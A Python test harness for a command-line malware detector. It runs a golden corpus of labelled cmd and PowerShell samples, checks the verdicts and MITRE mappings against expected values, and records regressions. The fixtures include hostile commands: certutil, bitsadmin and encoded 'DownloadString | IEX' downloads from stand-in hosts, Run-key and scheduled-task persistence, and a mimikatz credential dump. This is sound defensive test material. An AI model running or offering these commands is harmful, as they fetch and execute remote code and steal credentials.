"""RC5 · Phase 9.5+ · Golden Corpus Dashboard.

Continuously exercise a curated corpus of labeled samples end-to-end through
the deterministic RC5 pipeline and track 10 coverage / accuracy metrics:

  1. pass/fail rate
  2. regression count (regressed samples vs previous run)
  3. decode coverage        (samples whose decode stage confidence ≥ 70)
  4. semantic reconstruction coverage (semantic stage ≥ 70)
  5. behavior coverage       (≥ 1 behavior extracted where expected)
  6. MITRE accuracy          (technique set matches / superset of expected)
  7. LOLBIN accuracy         (executed lolbins match expected list)
  8. verdict accuracy        (verdict tier matches expected)
  9. newly supported samples (previously failing, now passing)
  10. newly failing samples  (previously passing, now failing)

Deterministic. No AI imports. No regex on raw text.

Storage: MongoDB collection `rc5_golden_runs` — one document per run.
"""
from __future__ import annotations

import hashlib
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Set, Tuple

from pydantic import BaseModel, ConfigDict, Field

from .exec_graph import ExecGraph
from .semantic_ir import SIRTree
from .detectors.behavior_extractor import extract_behaviors
from .detectors.lolbin_v2 import classify_lolbins, LolbinState
from .detectors.mitre_mapper import map_behaviors_to_mitre
from .detectors.verdict_v2 import compute_verdict
from .detectors.explainability import compile_explanation
from .parsers.cmd_parser import CmdParser
from .parsers.powershell_parser import PowerShellParser
from .interpreters.cmd_interpreter import CmdInterpreter
from .interpreters.powershell_interpreter import PowerShellInterpreter


COLLECTION = "rc5_golden_runs"

# ---------------------------------------------------------------------------
# Golden corpus — small, hand-curated. Extend freely; the runner scales.
# Every sample is (id, language, input, expected_dict).
# ---------------------------------------------------------------------------
GOLDEN_CORPUS: Tuple[Dict[str, Any], ...] = (
    {
        "id": "GC-001-echo-hi",
        "language": "cmd",
        "input": "echo hello world",
        "expected": {
            "verdict": "Benign",
            "mitre": [],
            "lolbins_executed": [],
        },
    },
    {
        "id": "GC-010-cmd-shell",
        "language": "cmd",
        "input": "cmd /c dir C:\\Users",
        "expected": {
            "verdict": "Benign",
            "mitre": ["T1059"],
            "lolbins_executed": ["cmd"],
        },
    },
    {
        "id": "GC-020-certutil-download",
        "language": "cmd",
        "input": "certutil -urlcache -f http://x.tld/a.exe C:\\a.exe",
        "expected": {
            "verdict_min": "Suspicious",
            "mitre": ["T1105", "T1140"],
            "lolbins_executed": ["certutil"],
        },
    },
    {
        "id": "GC-030-bitsadmin-transfer",
        "language": "cmd",
        "input": "bitsadmin /transfer job http://x.tld/a C:\\a.exe",
        "expected": {
            "verdict_min": "Suspicious",
            "mitre": ["T1105", "T1197"],
            "lolbins_executed": ["bitsadmin"],
        },
    },
    {
        "id": "GC-040-reg-add-run",
        "language": "cmd",
        "input": (r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run "
                  r"/v x /d C:\a.exe /f && bitsadmin /transfer j http://x/a a.exe"),
        "expected": {
            "verdict_min": "Malicious",   # ≥ Malicious tier acceptable
            "mitre": ["T1547", "T1105"],
            "lolbins_executed": ["bitsadmin"],
        },
    },
    {
        "id": "GC-050-schtasks-persistence",
        "language": "cmd",
        "input": "schtasks /create /tn x /tr C:\\a.exe /sc onlogon",
        "expected": {
            "verdict_min": "Suspicious",
            "mitre": ["T1053"],
            "lolbins_executed": ["schtasks"],
        },
    },
    {
        "id": "GC-060-sc-create-service",
        "language": "cmd",
        "input": 'sc create svc binpath= "C:\\bad.exe" start= auto',
        "expected": {
            "verdict_min": "Suspicious",
            "mitre": ["T1543"],
        },
    },
    {
        "id": "GC-070-mimikatz-lsass",
        "language": "cmd",
        "input": "mimikatz.exe sekurlsa::logonpasswords exit",
        "expected": {
            "verdict_min": "Malicious",
            "mitre": ["T1003"],
            "lolbins_executed": [],
        },
    },
    {
        "id": "GC-080-ps-download-iex",
        "language": "powershell",
        "input": "iwr -UseBasicParsing http://x.tld/a | iex",
        "expected": {
            "verdict_min": "Suspicious",
            "mitre": ["T1105"],
        },
    },
    {
        "id": "GC-090-ps-encoded-command",
        "language": "powershell",
        "input": ("powershell.exe -nop -w hidden -enc "
                  "SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AeAAuAHkALwBhACIAKQA="),
        "expected": {
            # Phase 9.5c: deep -enc decoding now recursively feeds the
            # decoded UTF-16LE Base64 payload back through the RC5
            # pipeline (Parser → SIR → Behavior → MITRE → Verdict).
            # Result: WebClient.DownloadString → HttpNode → T1105 +
            # T1071 + T1027 (obfuscation) + T1059 (PS execution).
            "verdict_min": "Malicious",
            "mitre": ["T1059", "T1027", "T1105"],
            "lolbins_executed": [],
        },
    },
    {
        "id": "GC-100-ps-registry-run",
        "language": "powershell",
        "input": ("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\"
                  "CurrentVersion\\Run' -Name x -Value 'C:\\a.exe'"),
        "expected": {
            "verdict_min": "Suspicious",
            "mitre": ["T1112", "T1547"],
        },
    },
    {
        "id": "GC-110-ps-start-process-benign",
        "language": "powershell",
        "input": "Start-Process notepad.exe",
        "expected": {
            "verdict": "Benign",
        },
    },
    {
        "id": "GC-120-mshta-remote",
        "language": "cmd",
        "input": "mshta http://x/x.hta",
        "expected": {
            "verdict_min": "Suspicious",
            "mitre": ["T1218"],
            "lolbins_executed": ["mshta"],
        },
    },
    {
        "id": "GC-130-rundll32-remote",
        "language": "cmd",
        "input": "rundll32 javascript:\"..\\mshtml,RunHTMLApplication \";alert(1);",
        "expected": {
            "verdict_min": "Suspicious",
            "mitre": ["T1218"],
            "lolbins_executed": ["rundll32"],
        },
    },
    {
        "id": "GC-140-wmic-process-call",
        "language": "cmd",
        "input": 'wmic process call create "notepad.exe"',
        "expected": {
            "verdict_min": "Suspicious",
            "mitre": ["T1047"],
            "lolbins_executed": ["wmic"],
        },
    },
) + __import__(
    # Extension bundle: benign enterprise + malware + edge cases.
    # Kept in a sibling module so this file stays readable and future
    # corpus growth doesn't inflate the runner file itself.
    "engine.golden_corpus_expansion",
    fromlist=["EXPANSION_CORPUS"],
).EXPANSION_CORPUS + __import__(
    # Phase 9.5d round-2 expansion (GC-260 → GC-290): more enterprise
    # workloads (Exchange EMS, ADFS, WSUS, DNS, PKI, DHCP, GPO, VSS,
    # FSRM, WUA, LAPS, RDS, SCOM, Defender) + malware families
    # (TrickBot, Ryuk, LockBit, BlackCat, Conti, Bumblebee, DarkGate,
    # IcedID, Astaroth, Snake KeyLogger, SocGholish, Latrodectus) +
    # obfuscation (Invoke-Obfuscation ticks, DOSfuscation, XSL LOLBAS).
    "engine.golden_corpus_expansion_r2",
    fromlist=["EXPANSION_R2_CORPUS"],
).EXPANSION_R2_CORPUS + __import__(
    # Phase 9.5d hotfix: family of obfuscation-benign regressions
    # proving the generic invariant "obfuscation is evidence, not
    # guilt". Any change that lets a multi-encoded benign string
    # elevate verdict above Benign will break this family.
    "engine.golden_corpus_obfuscation_family",
    fromlist=["OBFUSCATION_BENIGN_FAMILY"],
).OBFUSCATION_BENIGN_FAMILY


# ---------------------------------------------------------------------------
# Models
# ---------------------------------------------------------------------------
class SampleResult(BaseModel):
    model_config = ConfigDict(extra="forbid")

    sample_id: str
    input_hash: str
    language: str
    passed: bool = False
    reasons: List[str] = Field(default_factory=list)  # failure reasons
    got_verdict: str = ""
    expected_verdict: str = ""
    verdict_ok: bool = True
    mitre_ok: bool = True
    lolbin_ok: bool = True
    behavior_ok: bool = True
    decode_conf: int = 0
    semantic_conf: int = 0
    behavior_conf: int = 0
    mitre_conf: int = 0
    verdict_conf: int = 0
    weighted_conf: int = 0
    # Phase 9.5c+: per-sample latency instrumentation (deterministic —
    # measures pipeline compute time only, no I/O).
    duration_ms: float = 0.0
    exception: Optional[str] = None
    # Phase 9.5d+: canonical taxonomy category (see
    # engine.golden_corpus_taxonomy.CATEGORIES). Populated by
    # `_run_sample` via `category_for_sample_id`.
    category: str = "edge_case_regression"


class GoldenRunReport(BaseModel):
    model_config = ConfigDict(extra="forbid")

    run_id: str
    ts: datetime
    total: int
    passed: int
    failed: int
    pass_rate: float
    regression_count: int = 0
    newly_supported: List[str] = Field(default_factory=list)
    newly_failing: List[str] = Field(default_factory=list)
    coverage: Dict[str, float] = Field(default_factory=dict)   # decode / semantic / behavior / mitre / lolbin / verdict
    accuracy: Dict[str, float] = Field(default_factory=dict)   # per-metric
    # Phase 9.5c+: latency percentiles across all samples (ms).
    latency: Dict[str, float] = Field(default_factory=dict)    # mean / p50 / p95 / p99 / max
    # Phase 9.5d+: per-category coverage — { category: {total, passed, pass_rate} }.
    # Enables honest reporting like "downloaders: 8/8 pass (100%)" or
    # "credential_access: 1/2 (50%)" instead of just an aggregate number.
    category_coverage: Dict[str, Dict[str, float]] = Field(default_factory=dict)
    samples: List[SampleResult] = Field(default_factory=list)


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------
_TIER_RANK = {"Benign": 0, "Suspicious": 1, "Malicious": 2, "Critical": 3}


def _run_sample(sample: Dict[str, Any]) -> SampleResult:
    """Deterministically execute a single sample and return a SampleResult."""
    import time as _time
    from .golden_corpus_categories import category_for_sample_id
    lang = sample["language"]
    src = sample["input"]
    expected = sample["expected"]
    # Prefer an explicit `category` on the sample dict; fall back to the
    # ID-prefix map for legacy entries that predate Phase 9.5d.
    category = sample.get("category") or category_for_sample_id(sample["id"])
    result = SampleResult(
        sample_id=sample["id"],
        input_hash=hashlib.sha256(src.encode("utf-8")).hexdigest()[:16],
        language=lang,
        category=category,
    )
    _t0 = _time.perf_counter()
    try:
        parser = PowerShellParser() if lang == "powershell" else CmdParser()
        interp = PowerShellInterpreter() if lang == "powershell" else CmdInterpreter()
        sir = parser.parse(src)
        graph = interp.interpret(sir)
        behaviors = extract_behaviors(graph)
        mitre = map_behaviors_to_mitre(behaviors)
        lolbins = classify_lolbins(graph)
        verdict = compute_verdict(behaviors, mitre, lolbins)
        explain = compile_explanation(
            original_input=src, sir=sir, graph=graph, behaviors=behaviors,
            mitre=mitre, lolbins=lolbins, verdict=verdict,
        )
        result.got_verdict = verdict.verdict.value
        c = explain.confidence_breakdown
        result.decode_conf = c.decode
        result.semantic_conf = c.semantic_reconstruction
        result.behavior_conf = c.behavior
        result.mitre_conf = c.mitre
        result.verdict_conf = c.verdict
        result.weighted_conf = c.weighted_overall

        # ── verdict check
        expected_v = expected.get("verdict")
        expected_min = expected.get("verdict_min")
        if expected_v is not None:
            result.expected_verdict = expected_v
            result.verdict_ok = verdict.verdict.value == expected_v
            if not result.verdict_ok:
                result.reasons.append(
                    f"verdict mismatch: got {verdict.verdict.value}, expected {expected_v}")
        elif expected_min is not None:
            result.expected_verdict = f"≥{expected_min}"
            got_rank = _TIER_RANK.get(verdict.verdict.value, -1)
            need_rank = _TIER_RANK.get(expected_min, 999)
            result.verdict_ok = got_rank >= need_rank
            if not result.verdict_ok:
                result.reasons.append(
                    f"verdict below floor: got {verdict.verdict.value} < {expected_min}")

        # ── mitre check (superset)
        expected_mitre: Set[str] = set(expected.get("mitre") or [])
        got_mitre: Set[str] = {m.technique_id for m in mitre}
        if expected_mitre:
            missing = expected_mitre - got_mitre
            result.mitre_ok = not missing
            if missing:
                result.reasons.append(f"mitre missing: {sorted(missing)}")

        # ── lolbin check (executed subset)
        expected_lb: Set[str] = set(expected.get("lolbins_executed") or [])
        got_lb: Set[str] = {l.binary for l in lolbins if l.state == LolbinState.executed}
        if expected_lb:
            missing_lb = expected_lb - got_lb
            result.lolbin_ok = not missing_lb
            if missing_lb:
                result.reasons.append(f"lolbins missing: {sorted(missing_lb)}")

        # ── behavior coverage
        min_behaviors = expected.get("min_behaviors")
        if min_behaviors is not None:
            result.behavior_ok = len(behaviors) >= min_behaviors
            if not result.behavior_ok:
                result.reasons.append(
                    f"behavior count {len(behaviors)} < {min_behaviors}")

        result.passed = (result.verdict_ok and result.mitre_ok
                         and result.lolbin_ok and result.behavior_ok)
    except Exception as exc:  # pragma: no cover
        result.passed = False
        result.exception = f"{type(exc).__name__}: {exc}"
        result.reasons.append(result.exception)
    result.duration_ms = round((_time.perf_counter() - _t0) * 1000.0, 3)
    return result


def run_corpus(
    corpus: Tuple[Dict[str, Any], ...] = GOLDEN_CORPUS,
    previous: Optional[GoldenRunReport] = None,
) -> GoldenRunReport:
    """Run every sample; compute coverage + accuracy + regressions."""
    ts = datetime.now(timezone.utc)
    results = [_run_sample(s) for s in corpus]
    total = len(results)
    passed = sum(1 for r in results if r.passed)
    failed = total - passed
    pass_rate = round(passed / total * 100, 2) if total else 0.0

    # Coverage — % of samples where each stage confidence ≥ 70.
    def _pct(pred) -> float:
        return round(sum(1 for r in results if pred(r)) / total * 100, 2) if total else 0.0

    coverage = {
        "decode":       _pct(lambda r: r.decode_conf >= 70),
        "semantic":     _pct(lambda r: r.semantic_conf >= 70),
        "behavior":     _pct(lambda r: r.behavior_conf >= 70),
        "mitre":        _pct(lambda r: r.mitre_conf   >= 70),
        "verdict":      _pct(lambda r: r.verdict_conf >= 70),
    }
    accuracy = {
        "verdict": _pct(lambda r: r.verdict_ok),
        "mitre":   _pct(lambda r: r.mitre_ok),
        "lolbin":  _pct(lambda r: r.lolbin_ok),
        "behavior": _pct(lambda r: r.behavior_ok),
        "overall_pass_rate": pass_rate,
    }

    # Latency instrumentation — mean / p50 / p95 / p99 / max in ms.
    def _pct_lat(vals: List[float], q: float) -> float:
        if not vals:
            return 0.0
        s = sorted(vals)
        # Nearest-rank percentile, deterministic.
        k = max(0, min(len(s) - 1, int(round((q / 100.0) * (len(s) - 1)))))
        return round(s[k], 3)

    durations = [r.duration_ms for r in results]
    latency = {
        "mean_ms": round(sum(durations) / len(durations), 3) if durations else 0.0,
        "p50_ms":  _pct_lat(durations, 50),
        "p95_ms":  _pct_lat(durations, 95),
        "p99_ms":  _pct_lat(durations, 99),
        "max_ms":  round(max(durations), 3) if durations else 0.0,
        "total_ms": round(sum(durations), 3) if durations else 0.0,
    }

    # Per-category coverage (Phase 9.5d+) — honest reporting per taxonomy
    # bucket instead of a single aggregate number.
    from collections import defaultdict as _defaultdict
    _by_cat: Dict[str, List[SampleResult]] = _defaultdict(list)
    for r in results:
        _by_cat[r.category].append(r)
    category_coverage: Dict[str, Dict[str, float]] = {}
    for cat, rs in _by_cat.items():
        cat_total = len(rs)
        cat_passed = sum(1 for r in rs if r.passed)
        category_coverage[cat] = {
            "total": cat_total,
            "passed": cat_passed,
            "pass_rate": round(cat_passed / cat_total * 100.0, 2) if cat_total else 0.0,
        }

    # Regressions vs previous run
    regression_count = 0
    newly_supported: List[str] = []
    newly_failing: List[str] = []
    if previous:
        prev_ok = {r.sample_id for r in previous.samples if r.passed}
        cur_ok = {r.sample_id for r in results if r.passed}
        newly_supported = sorted(cur_ok - prev_ok)
        newly_failing = sorted(prev_ok - cur_ok)
        regression_count = len(newly_failing)

    run_id = "g_" + hashlib.sha1(
        f"{ts.isoformat()}|{total}|{passed}".encode()
    ).hexdigest()[:12]
    return GoldenRunReport(
        run_id=run_id, ts=ts, total=total, passed=passed, failed=failed,
        pass_rate=pass_rate,
        regression_count=regression_count,
        newly_supported=newly_supported,
        newly_failing=newly_failing,
        coverage=coverage, accuracy=accuracy, latency=latency,
        category_coverage=category_coverage,
        samples=results,
    )


# ---------------------------------------------------------------------------
# Storage
# ---------------------------------------------------------------------------
async def ensure_golden_indexes(db) -> None:
    await db[COLLECTION].create_index("ts")
    await db[COLLECTION].create_index("run_id")


async def record_run(db, report: GoldenRunReport) -> str:
    r = await db[COLLECTION].insert_one(report.model_dump(mode="python"))
    return str(r.inserted_id)


async def latest_run(db) -> Optional[GoldenRunReport]:
    doc = await db[COLLECTION].find_one({}, sort=[("ts", -1)])
    if not doc:
        return None
    doc.pop("_id", None)
    try:
        return GoldenRunReport(**doc)
    except Exception:
        return None


async def run_and_record(db) -> GoldenRunReport:
    previous = await latest_run(db)
    report = run_corpus(previous=previous)
    await record_run(db, report)
    return report


__all__ = [
    "COLLECTION",
    "GOLDEN_CORPUS",
    "SampleResult",
    "GoldenRunReport",
    "run_corpus",
    "ensure_golden_indexes",
    "record_run",
    "latest_run",
    "run_and_record",
]
